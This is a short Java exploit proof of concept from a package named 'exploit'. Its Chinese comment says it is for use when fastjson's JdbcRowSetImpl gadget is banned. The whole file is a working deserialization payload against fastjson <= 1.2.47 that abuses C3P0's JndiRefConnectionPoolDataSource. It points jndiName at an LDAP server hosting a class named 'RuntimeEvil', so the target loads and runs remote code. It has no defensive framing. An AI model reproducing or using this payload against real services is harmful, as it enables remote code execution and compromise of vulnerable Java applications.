package org.exploit.third.c3p0;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Paths;

//适用于打fastjson JdbcRowSetImpl被ban
//fastjson <= 1.2.47
//C3P0 <= 0.9.5.2
public class fastjson_JNDI {
    public static void main(String[] args) throws Exception {
        String payload = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"},{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\",\"jndiName\":\"ldap://127.0.0.1:1099/JDNI_RuntimeEvil\",\"loginTimeout\":2}}";
        JSON.parse(payload);
    }
}
